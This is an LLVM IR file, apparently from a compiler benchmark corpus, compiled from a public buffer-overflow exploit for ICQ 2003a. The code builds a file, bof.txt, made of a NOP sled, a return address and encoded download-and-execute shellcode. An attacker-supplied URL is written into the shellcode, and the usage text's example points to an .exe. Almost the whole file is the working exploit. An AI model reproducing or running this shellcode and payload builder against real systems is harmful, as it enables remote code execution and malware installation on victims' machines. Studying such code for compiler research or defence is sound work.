; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1277.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1277.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [68 x i8] c"\0A\0A\09Mirabilis ICQ 2003a Buffer Overflow Download Shellcoded Exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"\09Bug discovered & exploit coded by ATmaCA\0A\00", align 1
@.str.2 = private unnamed_addr constant [67 x i8] c"\09Web: http://www.spyinstructors.com  && http://www.atmacasoft.com\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"\09E-Mail: atmaca@icqmail.com\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"\09Credit to Kozan and delicon\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"Usage:\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c" icq_bof <WebUrl>\0A\00", align 1
@.str.7 = private unnamed_addr constant [54 x i8] c" Example:icq_bof http://www.atmacasoft.com/small.exe\0A\00", align 1
@__const.main.shellcode = private unnamed_addr constant [246 x i8] c"\EB\10X1\C9f\81\E9\22\FF\800\1D@\E2\FA\EB\05\E8\EB\FF\FF\FF\F4\D1\1D\1D\1DB\F5K\1D\1D\1D\94\DEMu\93S\13\F1\F5}\1D\1D\1D,\D4{\A4rsLuhoqpI\E2\CDMu+\072m\F5[\1D\1D\1D,\D4LL\90*K\90j\15KL\E2\CDNu\85\E3\97\13\F50\1D\1D\1DLJ\E2\CD,\D4T\FF\E3Nuc\C5\FFn\F5\04\1D\1D\1D\E2\CDHKy\BC-\1D\1D\1D\96]\11\96m\01\B0\96u\15\94\F5C@\DENHKJ\96q9\05\96X!\96I\18e\1C\F7\96W\05\96G=\1C\F6\FE(T\96)\96\1C\F3,\E2\E1,\DD\B1%\FDi\1A\DC\D2\10\1C\DA\F6\EF&a9\09h\FC\96G9\1C\F6{\96\11V\96G\01\1C\F6\96\19\96\1C\F5\F4\1F\1D\1D\1D,\DD\94\F7BC@F\DE\F52\E2\E2\E2puu3xex\1D\00", align 16
@.str.8 = private unnamed_addr constant [3 x i8] c"\22\FF\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"bof.txt\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.13 = private unnamed_addr constant [32 x i8] c"\0D\0Abof.txt has been generated!\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [246 x i8], align 16
  %6 = alloca i32*, align 8
  %7 = alloca [485 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %23

14:                                               ; preds = %2
  %15 = call i32 @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0))
  %19 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0))
  %20 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  %22 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  br label %79

23:                                               ; preds = %2
  %24 = bitcast [246 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %24, i8* align 16 getelementptr inbounds ([246 x i8], [246 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 246, i1 false)
  store i8* null, i8** %10, align 8
  %25 = load i8**, i8*** %4, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  store i8* %27, i8** %8, align 8
  store i16 -222, i16* %9, align 2
  %28 = getelementptr inbounds [246 x i8], [246 x i8]* %5, i64 0, i64 0
  %29 = call i8* @strstr(i8* %28, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  store i8* %29, i8** %10, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = call i32 @strlen(i8* %30)
  %32 = add nsw i32 %31, 1
  %33 = load i16, i16* %9, align 2
  %34 = sext i16 %33 to i32
  %35 = sub nsw i32 %34, %32
  %36 = trunc i32 %35 to i16
  store i16 %36, i16* %9, align 2
  %37 = load i8*, i8** %10, align 8
  %38 = call i32 (i8*, ...) @memcpy(i8* %37, i16* %9, i32 2)
  %39 = load i8*, i8** %8, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = sext i32 %40 to i64
  %42 = add i64 246, %41
  %43 = add i64 %42, 1
  %44 = trunc i64 %43 to i32
  %45 = call i64 @malloc(i32 %44)
  %46 = inttoptr i64 %45 to i8*
  store i8* %46, i8** %11, align 8
  %47 = load i8*, i8** %11, align 8
  %48 = getelementptr inbounds [246 x i8], [246 x i8]* %5, i64 0, i64 0
  %49 = call i32 @strcpy(i8* %47, i8* %48)
  %50 = load i8*, i8** %11, align 8
  %51 = load i8*, i8** %8, align 8
  %52 = call i8* @Sifrele(i8* %51)
  %53 = call i32 @strcat(i8* %50, i8* %52)
  %54 = load i8*, i8** %11, align 8
  %55 = call i32 @strcat(i8* %54, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %56 = call i32* @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  store i32* %56, i32** %6, align 8
  %57 = icmp eq i32* %56, null
  br i1 %57, label %58, label %59

58:                                               ; preds = %23
  br label %79

59:                                               ; preds = %23
  %60 = getelementptr inbounds [485 x i8], [485 x i8]* %7, i64 0, i64 0
  %61 = call i32 @memset(i8* %60, i32 144, i32 480)
  %62 = getelementptr inbounds [485 x i8], [485 x i8]* %7, i64 0, i64 34
  %63 = bitcast i8* %62 to i32*
  store i32 302144604, i32* %63, align 2
  %64 = getelementptr inbounds [485 x i8], [485 x i8]* %7, i64 0, i64 0
  %65 = getelementptr inbounds i8, i8* %64, i64 34
  %66 = getelementptr inbounds i8, i8* %65, i64 32
  %67 = load i8*, i8** %11, align 8
  %68 = load i8*, i8** %11, align 8
  %69 = call i32 @strlen(i8* %68)
  %70 = call i32 (i8*, ...) @memcpy(i8* %66, i8* %67, i32 %69)
  %71 = getelementptr inbounds [485 x i8], [485 x i8]* %7, i64 0, i64 480
  %72 = bitcast i8* %71 to i32*
  store i32 0, i32* %72, align 16
  %73 = load i32*, i32** %6, align 8
  %74 = getelementptr inbounds [485 x i8], [485 x i8]* %7, i64 0, i64 0
  %75 = call i32 @fprintf(i32* %73, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %74)
  %76 = load i32*, i32** %6, align 8
  %77 = call i32 @fclose(i32* %76)
  %78 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.13, i64 0, i64 0))
  br label %79

79:                                               ; preds = %59, %58, %14
  ret void
}

declare dso_local i32 @printf(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, ...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i8* @Sifrele(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
